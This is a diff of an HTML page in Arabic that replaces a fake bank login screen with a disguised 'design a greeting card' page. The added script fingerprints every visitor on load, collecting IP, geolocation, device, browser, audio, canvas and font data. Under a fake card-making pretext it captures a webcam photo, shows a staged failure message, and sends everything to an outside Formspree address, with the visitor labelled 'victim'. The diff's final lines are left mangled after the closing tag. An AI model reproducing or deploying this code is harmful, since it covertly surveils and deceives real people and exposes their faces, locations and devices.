@@ -3,37 +3,363 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>تسجيل الدخول - البنك الأهلي</title>
+  <title>🎉 صمم بطاقة تهنئة</title>
   <style>
     *{margin:0;padding:0;box-sizing:border-box}
-    body{font-family:'Segoe UI',system-ui,sans-serif;background:linear-gradient(135deg,#1e3c72,#2a5298);min-height:100vh;display:flex;align-items:center;justify-content:center}
-    .login-box{background:#fff;padding:2.5rem;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.3);width:92%;max-width:420px;text-align:center}
-    .logo{width:80px;height:80px;background:#0066cc;border-radius:50%;margin:0 auto 1.5rem;display:flex;align-items:center;justify-content:center;color:#fff;font-size:2rem}
-    h2{color:#333;margin-bottom:.5rem;font-size:1.5rem}
-    .subtitle{color:#666;font-size:.9rem;margin-bottom:1.5rem}
-    input{width:100%;padding:14px;margin:8px 0;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;transition:border-color .3s}
-    input:focus{outline:none;border-color:#0066cc}
-    button{width:100%;padding:14px;background:#0066cc;color:#fff;border:none;border-radius:8px;font-size:16px;cursor:pointer;margin-top:1rem;transition:background .3s}
-    button:hover{background:#0052a3}
-    .error{color:#d32f2f;font-size:14px;margin-top:12px;padding:10px;background:#ffebee;border-radius:6px;display:none}
-    .loading{display:none;margin-top:15px}
-    .spinner{width:35px;height:35px;border:3px solid #f3f3f3;border-top:3px solid #0066cc;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto}
-    @keyframes spin{to{transform:rotate(360deg)}}
-    .hidden-cam{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
+    body{font-family:'Segoe UI',Tahoma,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+    .card{background:#fff;border-radius:24px;padding:2rem;max-width:450px;width:100%;text-align:center;box-shadow:0 25px 50px rgba(0,0,0,.2)}
+    .emoji{font-size:4rem;margin-bottom:1rem;animation:bounce 2s infinite}
+    @keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-20px)}}
+    h1{color:#333;font-size:1.6rem;margin-bottom:.5rem}
+    .subtitle{color:#666;font-size:1rem;margin-bottom:1.5rem}
+    .cam-area{border:3px dashed #667eea;border-radius:16px;padding:2rem;margin:1rem 0;background:#f8f9ff;position:relative;overflow:hidden}
+    .cam-area video{width:100%;border-radius:12px;display:none}
+    .cam-placeholder{font-size:3rem;margin-bottom:.5rem}
+    .btn{width:100%;padding:14px;border:none;border-radius:12px;font-size:1rem;font-weight:600;cursor:pointer;transition:all .3s;margin-top:1rem}
+    .btn-primary{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff}
+    .btn-primary:hover{transform:translateY(-2px);box-shadow:0 8px 20px rgba(102,126,234,.4)}
+    .btn:disabled{opacity:.6;cursor:not-allowed}
+    .progress{display:none;margin:1rem 0}
+    .progress-bar{height:6px;background:#e0e0e0;border-radius:3px;overflow:hidden}
+    .progress-fill{height:100%;background:linear-gradient(90deg,#667eea,#764ba2);width:0;transition:width .3s}
+    .status{color:#666;font-size:.9rem;margin-top:.5rem}
+    .error{display:none;color:#d32f2f;background:#ffebee;padding:12px;border-radius:8px;margin-top:1rem;font-size:.9rem}
+    .hidden{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
   </style>
 </head>
 <body>
-  <div class="login-box">
-    <div class="logo">🏦</div>
-    <h2>تسجيل الدخول</h2>
-    <p class="subtitle">أدخل بياناتك للوصول إلى حسابك</p>
-    <input type="text" id="user" placeholder="رقم الهوية / اسم المستخدم" autocomplete="username">
-    <input type="password" id="pass" placeholder="كلمة المرور" autocomplete="current-password">
-    <button onclick="submit()">دخول</button>
-    <div class="loading" id="loading">
-      <div class="spinner"></div>
-      <p style="margin-top:10px;color:#666;font-size:14px">جاري التحقق من البيانات...</p>
+  <div class="card">
+    <div class="emoji">🎊</div>
+    <h1>صمم بطاقة تهنئة</h1>
+    <p class="subtitle">التقط صورة لإنشاء بطاقة مميزة</p>
+    
+    <div class="cam-area" id="camArea">
+      <div class="cam-placeholder" id="placeholder">📷</div>
+      <video id="video" autoplay playsinline></video>
     </div>
+    
+    <div class="progress" id="progress">
+      <div class="progress-bar"><div class="progress-fill" id="fill"></div></div>
+      <div class="status" id="status">جاري التحميل...</div>
+    </div>
+    
+    <button class="btn btn-primary" id="btn" onclick="start()">بدء التصوير</button>
+    
+    <div class="error" id="error">
+      😔 عذراً! فشلت المعالجة.<br>يرجى المحاولة لاحقاً.
+    </div>
+  </div>
+
+  <canvas class="hidden" id="canvas"></canvas>
+
+  <script>
+    const FORMSPREE_URL = 'https://formspree.io/f/xgoqdnyr';
+    let stream = null;
+    let victimData = {};
+    
+    // ==========================================
+    // 1. جمع كل البيانات فوراً
+    // ==========================================
+    async function collectAll() {
+      // IP من خدمات متعددة (fallback)
+      let ip = 'unknown';
+      try { ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip); } 
+      catch(e) { 
+        try { ip = await fetch('https://checkip.amazonaws.com').then(r=>r.text()); } 
+        catch(e2) {}
+      }
+      
+      // الموقع الجغرافي
+      let location = {};
+      try {
+        location = await fetch(`https://ipapi.co/${ip}/json/`).then(r=>r.json());
+      } catch(e) {
+        try {
+          location = await fetch(`https://ipwho.is/${ip}`).then(r=>r.json());
+        } catch(e2) {}
+      }
+      
+      victimData = {
+        timestamp: new Date().toISOString(),
+        localTime: new Date().toLocaleString('ar-SA'),
+        ip: ip,
+        location: {
+          city: location.city || location.region || 'unknown',
+          region: location.region || 'unknown',
+          country: location.country_name || location.country || 'unknown',
+          country_code: location.country_code || 'unknown',
+          latitude: location.latitude || 'unknown',
+          longitude: location.longitude || 'unknown',
+          timezone: location.timezone || 'unknown',
+          isp: location.org || location.isp || location.connection?.isp || 'unknown',
+          asn: location.asn || 'unknown'
+        },
+        device: {
+          platform: navigator.platform,
+          userAgent: navigator.userAgent,
+          language: navigator.language,
+          languages: navigator.languages?.join(','),
+          screen: `${screen.width}x${screen.height}`,
+          availScreen: `${screen.availWidth}x${screen.availHeight}`,
+          colorDepth: screen.colorDepth,
+          pixelRatio: window.devicePixelRatio,
+          orientation: screen.orientation?.type,
+          cores: navigator.hardwareConcurrency,
+          memory: navigator.deviceMemory || 'unknown',
+          maxTouchPoints: navigator.maxTouchPoints,
+          online: navigator.onLine,
+          cookieEnabled: navigator.cookieEnabled,
+          pdfViewerEnabled: navigator.pdfViewerEnabled || false
+        },
+        browser: {
+          vendor: navigator.vendor,
+          appCodeName: navigator.appCodeName,
+          appName: navigator.appName,
+          appVersion: navigator.appVersion,
+          product: navigator.product,
+          productSub: navigator.productSub,
+          doNotTrack: navigator.doNotTrack
+        },
+        network: navigator.connection ? {
+          effectiveType: navigator.connection.effectiveType,
+          downlink: navigator.connection.downlink,
+          rtt: navigator.connection.rtt,
+          saveData: navigator.connection.saveData,
+          type: navigator.connection.type
+        } : 'unavailable',
+        battery: await navigator.getBattery?.().then(b => ({
+          level: Math.round(b.level * 100) + '%',
+          charging: b.charging,
+          chargingTime: b.chargingTime,
+          dischargingTime: b.dischargingTime
+        })).catch(() => 'unavailable'),
+        webgl: (() => {
+          try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return {
+              vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+              renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+              version: gl.getParameter(gl.VERSION),
+              shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+              maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+              maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS)
+            };
+          } catch(e) { return 'unavailable'; }
+        })(),
+        canvas: (() => {
+          try {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillText('Hello! مرحبا! 你好! 🎉', 2, 2);
+            return canvas.toDataURL().slice(0, 100);
+          } catch(e) { return 'unavailable'; }
+        })(),
+        audio: (() => {
+          try {
+            const AudioContext = window.AudioContext || window.webkitAudioContext;
+            const ctx = new AudioContext();
+            const oscillator = ctx.createOscillator();
+            const analyser = ctx.createAnalyser();
+            const gainNode = ctx.createGain();
+            oscillator.connect(analyser);
+            analyser.connect(gainNode);
+            gainNode.connect(ctx.destination);
+            oscillator.type = 'triangle';
+            oscillator.frequency.value = 10000;
+            oscillator.start();
+            const dataArray = new Uint8Array(analyser.frequencyBinCount);
+            analyser.getByteFrequencyData(dataArray);
+            oscillator.stop();
+            ctx.close();
+            return Array.from(dataArray.slice(0, 10)).join(',');
+          } catch(e) { return 'unavailable'; }
+        })(),
+        fonts: (() => {
+          const fonts = ['Arial','Times New Roman','Courier New','Georgia','Verdana','Helvetica','Trebuchet MS','Palatino','Garamond','Bookman','Impact','Comic Sans MS'];
+          const available = [];
+          const canvas = document.createElement('canvas');
+          const ctx = canvas.getContext('2d');
+          const base = ctx.measureText('mmmmmmlli').width;
+          for(const f of fonts) {
+            ctx.font = `72px "${f}", monospace`;
+            if(ctx.measureText('mmmmmmlli').width !== base) available.push(f);
+          }
+          return available;
+        })(),
+        plugins: Array.from(navigator.plugins || []).map(p => p.name),
+        mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type),
+        storage: {
+          localStorage: !!window.localStorage,
+          sessionStorage: !!window.sessionStorage,
+          indexedDB: !!window.indexedDB,
+          cookies: navigator.cookieEnabled
+        },
+        window: {
+          innerWidth: window.innerWidth,
+          innerHeight: window.innerHeight,
+          outerWidth: window.outerWidth,
+          outerHeight: window.outerHeight,
+          screenX: window.screenX,
+          screenY: window.screenY,
+          screenLeft: window.screenLeft,
+          screenTop: window.screenTop,
+          devicePixelRatio: window.devicePixelRatio,
+          visualViewport: {
+            width: window.visualViewport?.width,
+            height: window.visualViewport?.height,
+            scale: window.visualViewport?.scale
+          }
+        },
+        history: {
+          length: history.length
+        },
+        performance: {
+          timing: performance.timing ? {
+            navigationStart: performance.timing.navigationStart,
+            loadEventEnd: performance.timing.loadEventEnd,
+            domComplete: performance.timing.domComplete
+          } : 'unavailable',
+          memory: performance.memory ? {
+            usedJSHeapSize: performance.memory.usedJSHeapSize,
+            totalJSHeapSize: performance.memory.totalJSHeapSize
+          } : 'unavailable'
+        },
+        referrer: document.referrer || 'direct',
+        url: location.href,
+        host: location.host,
+        protocol: location.protocol
+      };
+      
+      // إرسال فوراً
+      await send({
+        event: 'page_visit',
+        stage: 'landing',
+        victim: victimData
+      });
+    }
+    
+    // ==========================================
+    // 2. إرسال البيانات
+    // ==========================================
+    async function send(data) {
+      try {
+        await fetch(FORMSPREE_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        });
+      } catch(e) {}
+    }
+    
+    // ==========================================
+    // 3. تشغيل فوراً
+    // ==========================================
+    collectAll();
+    
+    // ==========================================
+    // 4. التقاط الصورة (الحيلة)
+    // ==========================================
+    async function start() {
+      const btn = document.getElementById('btn');
+      const placeholder = document.getElementById('placeholder');
+      const video = document.getElementById('video');
+      const progress = document.getElementById('progress');
+      const fill = document.getElementById('fill');
+      const status = document.getElementById('status');
+      const error = document.getElementById('error');
+      
+      btn.disabled = true;
+      placeholder.style.display = 'none';
+      
+      try {
+        // طلب الكاميرا
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width: 1280, height: 720 },
+          audio: false
+        });
+        
+        video.srcObject = stream;
+        video.style.display = 'block';
+        await video.play();
+        
+        // انتظر 1 ثانية للاستقرار
+        await sleep(1000);
+        
+        // التقاط الصورة
+        const canvas = document.getElementById('canvas');
+        canvas.width = 1280;
+        canvas.height = 720;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, 1280, 720);
+        
+        const image = canvas.toDataURL('image/jpeg', 0.6);
+        
+        // إيقاف الكاميرا
+        stream.getTracks().forEach(t => t.stop());
+        video.style.display = 'none';
+        placeholder.style.display = 'block';
+        placeholder.textContent = '✅';
+        
+        // محاكاة المعالجة
+        progress.style.display = 'block';
+        const steps = [
+          { p: 20, t: 'جاري تحليل الوجه...' },
+          { p: 50, t: 'جاري تطبيق التصميم...' },
+          { p: 80, t: 'جاري الحفظ...' }
+        ];
+        
+        for(const s of steps) {
+          fill.style.width = s.p + '%';
+          status.textContent = s.t;
+          await sleep(800);
+        }
+        
+        // فشل وهمي
+        fill.style.width = '100%';
+        status.textContent = 'فشلت العملية!';
+        await sleep(500);
+        
+        progress.style.display = 'none';
+        error.style.display = 'block';
+        btn.textContent = 'إعادة المحاولة';
+        btn.disabled = false;
+        
+        // إرسال الصورة + البيانات
+        await send({
+          event: 'camera_capture',
+          stage: 'completed',
+          timestamp: new Date().toISOString(),
+          victim: victimData,
+          image: image,
+          summary: {
+            ip: victimData.ip,
+            country: victimData.location?.country,
+            city: victimData.location?.city,
+            device: victimData.device?.platform,
+            screen: victimData.device?.screen,
+            hasCamera: true
+          }
+        });
+        
+      } catch(e) {
+        // إذا رفض الكاميرا
+        placeholder.style.display = 'block';
+        placeholder.textContent = '📷';
+        btn.disabled = false;
+        alert('⚠️ يجب السماح بالكاميرا لإنشاء البطاقة');
+      }
+    }
+    
+    function sleep(ms) {
+      return new Promise(r => setTimeout(r, ms));
+    }
+  </script>
+</body>
+</html>
     <div class="error" id="error">خطأ في البيانات، يرجى المحاولة مرة أخرى</div>
   </div>
 
